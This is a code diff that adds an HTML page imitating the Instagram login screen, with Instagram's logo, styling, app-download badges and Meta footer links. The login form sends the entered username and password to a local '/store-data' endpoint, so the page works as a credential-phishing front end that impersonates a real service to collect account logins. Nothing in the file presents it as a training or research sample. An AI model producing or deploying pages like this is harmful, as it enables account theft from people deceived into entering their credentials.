@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 10px;
+        }
+
+        .login-box img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background-color: #fafafa;
+        }
+
+        .login-box button {
+    
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .forgot-password {
+            display: block;
+            color: #0095f6;
+            margin-top: 12px;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .signup-box {
+            padding: 15px;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            width: 350px;
+            margin-top: 10px;
+            border-radius: 8px;
+        }
+
+        .get-app {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .app-links {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .app-links img {
+            width: 135px;
+            height: 40px;
+        }
+
+        footer {
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 30px;
+        }
+
+        footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
+            <form action="/store-data" method="post">
+                <input type="text" name="username" placeholder="Username" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="/signup" >Sign up</a></p>
+        </div>
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-links">
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DE07C2E19-FD52-42D1-AC41-09E4125E3E39%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Google Play"></a>
+                <a href="https://www.apple.com/in/app-store/"><img src="https://upload.wikimedia.org/wikipedia/commons/6/67/App_Store_%28iOS%29.svg" alt="App Store"></a>
+            </div>
+        </div>
+        <footer>
+            <p>
+                <a href="https://about.meta.com/">Meta</a> · <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a> · <a href="https://help.instagram.com/581066165581870/">Terms</a> · <a href="https://help.instagram.com/">Help</a>
+            </p>
+            <p>© 2025 Instagram from Meta</p>
+        </footer>
+    </div>
+</body>
+</html>
